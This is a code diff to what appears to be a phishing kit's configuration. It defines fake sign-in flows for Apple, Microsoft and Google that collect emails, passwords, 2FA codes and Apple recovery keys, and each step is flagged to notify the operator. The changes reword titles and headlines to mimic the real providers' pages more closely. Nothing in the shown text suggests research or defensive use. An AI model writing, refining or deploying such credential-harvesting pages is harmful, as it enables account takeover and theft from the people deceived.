@@ -611,20 +611,20 @@ const FLOWS = {
   // ── TECH ────────────────────────────────────────────────────────────────────
 
   apple: [
-    { slug:'apple-id',     form_type:'login',  page_title:'Apple ID',          headline:'Sign in with Apple ID',              subheadline:'Enter your Apple ID',                       fields:['email'],                    layout:'auth',  cta:'Next',               step_label:'Apple ID',         notify_step:true  },
+    { slug:'apple-id',     form_type:'login',  page_title:'Apple ID',          headline:'Sign in with your Apple ID',         subheadline:'',                       fields:['email'],                    layout:'auth',  cta:'Next',               step_label:'Apple ID',         notify_step:true  },
     { slug:'password',     form_type:'login',  page_title:'Password',          headline:'Enter your Apple ID password',        subheadline:'',                                           fields:['password'],                 layout:'auth',  cta:'Sign In',            step_label:'Password',         notify_step:true  },
     { slug:'2fa-device',   form_type:'otp',    page_title:'Device Verification',headline:'Verify Your Identity',               subheadline:'A 6-digit code was sent to your trusted device', fields:['code'],               layout:'otp',   cta:'Continue',           step_label:'Device 2FA',       notify_step:true,  otp_length:6 },
     { slug:'recovery-key', form_type:'verify', page_title:'Recovery Key',      headline:'Account Recovery Key',                subheadline:'Enter your 28-character account recovery key', fields:['recovery_key'],           layout:'verify',cta:'Reset',              step_label:'Recovery Key',     notify_step:true  }
   ],
 
   microsoft: [
-    { slug:'email',    form_type:'login', page_title:'Sign In',          headline:'Sign In',                            subheadline:'Enter your Microsoft account',              fields:['email'],             layout:'auth', cta:'Next',      step_label:'Email',    notify_step:true  },
+    { slug:'email',    form_type:'login', page_title:'Sign in to your Microsoft account',headline:'Sign in',            subheadline:'',                                          fields:['email'],             layout:'auth', cta:'Next',      step_label:'Email',    notify_step:true  },
     { slug:'password', form_type:'login', page_title:'Enter Password',   headline:'Enter your password',                subheadline:'',                                          fields:['password'],          layout:'auth', cta:'Sign In',   step_label:'Password', notify_step:true  },
     { slug:'2fa',      form_type:'otp',   page_title:'Verification',     headline:'Approve Sign-In Request',            subheadline:'Enter the code from Microsoft Authenticator', fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'2FA',      notify_step:true,  otp_length:6 }
   ],
 
   google: [
-    { slug:'email',    form_type:'login', page_title:'Sign In',          headline:'Sign In',                            subheadline:'Go to your Google Account',                 fields:['email'],             layout:'auth', cta:'Next',      step_label:'Email',    notify_step:true  },
+    { slug:'email',    form_type:'login', page_title:'Sign in - Google Accounts',headline:'Sign in',                       subheadline:'Use your Google Account',                   fields:['email'],             layout:'auth', cta:'Next',      step_label:'Email',    notify_step:true  },
     { slug:'password', form_type:'login', page_title:'Welcome',          headline:'Welcome',                            subheadline:'Enter your password',                       fields:['password'],          layout:'auth', cta:'Next',      step_label:'Password', notify_step:true  },
     { slug:'2fa',      form_type:'otp',   page_title:'Verification',     headline:'Verify Your Identity',               subheadline:'Google sent a code to your phone',          fields:['code'],              layout:'otp',  cta:'Next',      step_label:'2FA',      notify_step:true,  otp_length:6 }
   ],
